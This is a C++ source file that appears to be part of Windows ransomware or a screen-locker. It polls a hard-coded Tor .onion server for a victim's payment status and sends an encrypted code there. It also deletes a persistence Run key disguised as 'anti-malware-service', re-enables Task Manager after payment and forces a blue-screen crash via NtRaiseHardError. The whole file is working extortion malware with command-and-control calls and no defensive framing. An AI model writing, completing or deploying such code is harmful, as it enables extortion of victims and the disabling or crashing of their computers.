#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <wininet.h>
#include "panels.h"
#include "cryptography.h"
#include "network.h"
#pragma comment(lib, "ntdll.lib")

using namespace std;

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

string readIdFile()
{
    string id;

    ifstream readId("id.txt");
    while (getline(readId, id)) {
        cout << id;
    }
    readId.close();

    return id;

}

string getStatus()
{
    string id = readIdFile();

    string status = ReqToUrl("http://s4m5vyfx72sjlsuzt72fabn3iv2igwovo3azn27im3xz3emt47gk6zad.onion/b/status.php?id=" + id);

    return status;
}

string getPaymentValidation()
{

    string id = readIdFile();

    string status = getPayStatus("http://s4m5vyfx72sjlsuzt72fabn3iv2igwovo3azn27im3xz3emt47gk6zad.onion/b/validate.php?id=" + id);

    return status;
}

void Unlock(string status)
{

    if (status == "2")
    {

        HKEY hKey;

        LONG lnRes = RegOpenKeyEx(
            HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE,
            &hKey
        );
        RegDeleteValue(hKey, "anti-malware-service");

        system("start C:\\Windows\\explorer.exe");

        HKEY hTaskey;
        DWORD val = 0;
        LONG lnTaskRes = RegOpenKeyEx(
            HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            0, KEY_WRITE,
            &hTaskey
        );


        lnTaskRes = RegSetValueEx(hTaskey,
            "DisableTaskMgr",
            NULL,
            REG_DWORD,
            (const BYTE*)&val,
            sizeof(val));

        system("taskkill /f /IM ONloader.exe");
    }
   
}


void GetDesktopResolution(int& horizontal, int& vertical)
{
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    horizontal = desktop.right;
    vertical = desktop.bottom;
}


void SendCode()
{

    string strCode = getCode();

    bool canSend = true;

    ofstream sendCount;

    if (strCode.empty() || all_of(strCode.begin(), strCode.end(), [](char c) {return isspace(c); }))
    {
        MessageBox(0, "Empty", "Empty", MB_ICONERROR);
    }
    else
    {

        string id = readIdFile();

        stringstream code;

        strCode.erase(std::remove_if(strCode.begin(), strCode.end(), std::isspace), strCode.end());

        string encCode = encrypt_text(strCode);

        string encodCode = EncodeBase64(encCode);

        code << "http://s4m5vyfx72sjlsuzt72fabn3iv2igwovo3azn27im3xz3emt47gk6zad.onion/b/insertcode.php?uid=" << id << "&code=" << encodCode;

        string sendCode = code.str();

        ReqToUrl(sendCode);

    }

}


void checkConnectionStatus()
{

    char url[128];
    strcat(url, "http://127.0.0.1:9050");
    char verifyUrl[128];
    strcat(verifyUrl, "https://google.com");

    while (true)
    {
        string serverStatus = CheckCon("http://s4m5vyfx72sjlsuzt72fabn3iv2igwovo3azn27im3xz3emt47gk6zad.onion/b/");
        int internetCon = InternetCheckConnectionA(verifyUrl, FLAG_ICC_FORCE_CONNECTION, 0);
        int proxyCon = InternetCheckConnectionA(url, FLAG_ICC_FORCE_CONNECTION, 0);
        string id = readIdFile();

        string pay_status = getPayStatus("http://s4m5vyfx72sjlsuzt72fabn3iv2igwovo3azn27im3xz3emt47gk6zad.onion/b/validate.php?id=" + id);

        ofstream fs;
        fs.open("server_status.txt");
        fs << serverStatus << endl;
        fs.close();

        pay_status.erase(std::remove_if(pay_status.begin(), pay_status.end(), std::isspace), pay_status.end());
        fs.open("pay_status.txt");
        fs << pay_status << endl;
        fs.close();

        fs.open("internet_con.txt");
        fs << internetCon << endl;
        fs.close();
        fs.open("proxy_con.txt");
        fs << proxyCon << endl;
        fs.close();

        Sleep(3000);

    }

}

bool checkProxyCon()
{

    char url[128];
    strcat(url, "http://127.0.0.1:9050");
    char verifyUrl[128];
    strcat(verifyUrl, "https://google.com");

    bool internetCon = InternetCheckConnectionA(verifyUrl, FLAG_ICC_FORCE_CONNECTION, 0);
    bool proxyCon = InternetCheckConnectionA(url, FLAG_ICC_FORCE_CONNECTION, 0);

    return proxyCon;

}

void BlueScreen()
{
    BOOLEAN bl;
    ULONG Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); 
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); 
}